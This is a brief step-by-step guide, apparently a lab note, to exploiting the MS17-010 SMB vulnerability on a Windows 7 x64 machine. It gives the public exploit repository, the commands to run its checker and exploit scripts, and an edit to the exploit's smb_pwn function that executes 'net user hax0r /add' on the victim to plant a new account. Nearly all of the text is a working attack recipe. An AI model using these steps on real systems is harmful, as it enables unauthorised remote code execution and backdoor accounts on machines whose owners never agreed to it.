# MS17-010 Manualy

On Victim machine:


Windows 7 x64

Open share from unprivileged user.


On attacker machine: 

Download MS17-010 from Github:

https://github.com/worawit/MS17-010



Check if victim machine is vulnerable to MS17-010:

From MS17-010 directory :

At ‘checker.py’ script, update ‘USERNAME’ and ‘PASSWORD’ variable to relevance (unprivilege user) in the beginning of script.



Run Checker:

<b>python checker.py \<target ip\></b>


At ‘zzz_exploit.py’ script, update ‘USERNAME’ and ‘PASSWORD’ variable to relevance, and <b>‘def smb_pwn’</b> function to include command to execute:

  <b>service_exec(conn, r'cmd /c net user hax0r /add')</b>


To run ‘zzz_exploit.py’:


<b>python zzz_exploit.py \<target ip\> lsarpc</b>
